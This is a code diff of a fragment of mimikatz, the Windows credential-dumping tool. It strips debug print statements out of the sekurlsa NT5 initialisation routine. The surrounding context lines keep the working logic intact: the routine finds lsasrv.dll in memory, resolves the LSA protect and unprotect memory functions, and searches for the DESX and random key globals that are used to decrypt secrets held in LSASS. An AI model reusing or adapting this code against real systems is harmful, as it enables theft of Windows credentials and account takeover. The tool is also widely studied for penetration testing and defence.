@@ -35,8 +35,6 @@ NTSTATUS kuhl_m_sekurlsa_nt5_init()
 	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION vbInfos;
 
 
-	PRINT_ERROR(L"[MIMIKATZ] HERE!");
-
 	if(!NT_SUCCESS(kuhl_m_sekurlsa_nt5_KeyInit))
 	{
 		if(!kuhl_m_sekurlsa_nt5_hLsasrv)
@@ -44,44 +42,31 @@ NTSTATUS kuhl_m_sekurlsa_nt5_init()
 		
 		if(kuhl_m_sekurlsa_nt5_hLsasrv)
 		{
-			PRINT_ERROR(L"[MIMIKATZ] HERE 2");
 			if (kull_m_process_getVeryBasicModuleInformationsForName(&hMemory, L"lsasrv.dll", &vbInfos))
 			{
-				PRINT_ERROR(L"[MIMIKATZ] HERE 3");
 				sMemory.kull_m_memoryRange.kull_m_memoryAdress = vbInfos.DllBase;
 				sMemory.kull_m_memoryRange.size = vbInfos.SizeOfImage;
 
 				if (!kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory)
 				{
-					PRINT_ERROR(L"[MIMIKATZ] HERE 4");
 					if (
 						(extractPkgFunctionTable.LsaICancelNotification = GetProcAddress(kuhl_m_sekurlsa_nt5_hLsasrv, "LsaICancelNotification")) &&
 						(extractPkgFunctionTable.LsaIRegisterNotification = GetProcAddress(kuhl_m_sekurlsa_nt5_hLsasrv, "LsaIRegisterNotification"))
 						)
 					{
-						PRINT_ERROR(L"[MIMIKATZ] HERE 5");
 						if (kull_m_memory_search(&aMemory, sizeof(extractPkgFunctionTable), &sMemory, FALSE))
 						{
-							PRINT_ERROR(L"[MIMIKATZ] HERE 6");
 							kuhl_m_sekurlsa_nt5_pLsaProtectMemory = ((PLSA_SECPKG_FUNCTION_TABLE)((PBYTE)sMemory.result - FIELD_OFFSET(LSA_SECPKG_FUNCTION_TABLE, RegisterNotification)))->LsaProtectMemory;
 							kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory = ((PLSA_SECPKG_FUNCTION_TABLE)((PBYTE)sMemory.result - FIELD_OFFSET(LSA_SECPKG_FUNCTION_TABLE, RegisterNotification)))->LsaUnprotectMemory;
 						}
-						else
-							PRINT_ERROR(L"[MIMIKATZ] NOT HERE 6");
 					}
-					else
-						PRINT_ERROR(L"[MIMIKATZ] NOT HERE 5");
 				}
-				else
-					PRINT_ERROR(L"[MIMIKATZ] NOT HERE 4");
 
 				if (kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory)
 				{
-					PRINT_ERROR(L"[MIMIKATZ] HERE 7");
 					aMemory.address = PTRN_WNT5_LsaInitializeProtectedMemory_KEY;
 					if (kull_m_memory_search(&aMemory, sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY), &sMemory, FALSE))
 					{
-						PRINT_ERROR(L"[MIMIKATZ] HERE 8");
 #ifdef _M_X64
 						g_Feedback		= (PBYTE  )(((PBYTE) sMemory.result + OFFS_WNT5_g_Feedback)		+ sizeof(LONG) + *(LONG *)((PBYTE) sMemory.result + OFFS_WNT5_g_Feedback));
 						g_pRandomKey	= (PBYTE *)(((PBYTE) sMemory.result + OFFS_WNT5_g_pRandomKey)	+ sizeof(LONG) + *(LONG *)((PBYTE) sMemory.result + OFFS_WNT5_g_pRandomKey));
@@ -95,7 +80,6 @@ NTSTATUS kuhl_m_sekurlsa_nt5_init()
 #endif
 						if (g_Feedback && g_pRandomKey && g_pDESXKey && g_cbRandomKey)
 						{
-							PRINT_ERROR(L"[MIMIKATZ] HERE 9");
 							*g_cbRandomKey = 256;
 							*g_pRandomKey = (PBYTE)LocalAlloc(LPTR, *g_cbRandomKey);
 							*g_pDESXKey = (PBYTE)LocalAlloc(LPTR, 144);
@@ -103,17 +87,9 @@ NTSTATUS kuhl_m_sekurlsa_nt5_init()
 							if (*g_pRandomKey && *g_pDESXKey)
 								kuhl_m_sekurlsa_nt5_KeyInit = STATUS_SUCCESS;
 						}
-						else
-							PRINT_ERROR(L"[MIMIKATZ] NOT HERE 9");
 					}
-					else
-						PRINT_ERROR(L"[MIMIKATZ] NOT HERE 8");
 				}
-				else
-					PRINT_ERROR(L"[MIMIKATZ] NOT HERE 7");
 			}
-			else
-				PRINT_ERROR(L"[MIMIKATZ] NOT HERE 3");
 		} else PRINT_ERROR(L"[MIMIKATZ] failed to load lsasrv");
 	}
 	return kuhl_m_sekurlsa_nt5_KeyInit;
